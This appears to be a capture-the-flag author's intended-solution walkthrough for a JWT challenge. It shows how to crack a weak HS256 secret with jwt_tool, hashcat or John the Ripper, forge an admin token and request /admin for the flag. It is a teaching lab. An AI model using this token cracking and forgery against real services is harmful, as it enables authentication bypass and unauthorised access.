🧠 Intended Solution (what players should do)
Step 1 — Get a token

Visit:

/login

You get:

{"token": "<JWT_TOKEN>"}
Step 2 — Decode the JWT

Use something like:

jwt.io

They will see:

{
  "user": "guest"
}
Step 3 — Notice vulnerability

Hints:

Weak secret (123456)
Algorithm: HS256 (symmetric)

So the attack is:
👉 Bruteforce or guess the secret

Step 4 — Forge admin token

Once secret is found:

Payload:

{
  "user": "admin"
}

Sign with:

secret = 123456
Step 5 — Access admin endpoint

Send request:

GET /admin
Authorization: <FORGED_TOKEN>

Response:

FLAG{jwt_bruteforce_success}
🛠️ How to Solve (expected tools)

Players might use:

hashcat
John the Ripper
jwt_tool

Example (jwt_tool):

jwt_tool <token> -C -d wordlist.txt